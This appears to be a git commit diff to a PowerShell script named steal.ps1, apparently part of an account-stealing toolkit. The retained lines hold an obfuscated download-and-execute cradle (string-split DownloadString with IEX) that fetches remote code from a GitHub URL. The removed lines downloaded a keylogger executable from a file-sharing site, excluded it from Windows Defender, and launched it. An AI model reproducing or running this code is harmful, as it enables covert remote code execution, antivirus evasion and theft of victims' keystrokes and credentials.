c89b6a50d5e9ff0a7f25132d0ddc7ecadba1a3fe
43a1723 <hai1723notgay@gmail.com>
2024-09-21 11:36:33 +0700

    Update steal.ps1

--- scr/steal.ps1
+++ scr/steal.ps1
@@ -9,14 +9,3 @@ $shellcode = ("https://raw.githubusercontent.com/s1uiasdad/log-acc-v2/main/scr/s
 $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
 Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
 
-
-$url = "https://anonsharing.com/file/ad067c17c7feb767/keylog.exe"
-$output = "$dir\log.scr"
-Add-MpPreference -ExclusionPath $output
-if (Test-Path -Path $output) {
-    Write-Host "hello"
-} else {
-    Invoke-WebRequest -Uri $url -OutFile $output
-}
-
-Start-Process -FilePath $output
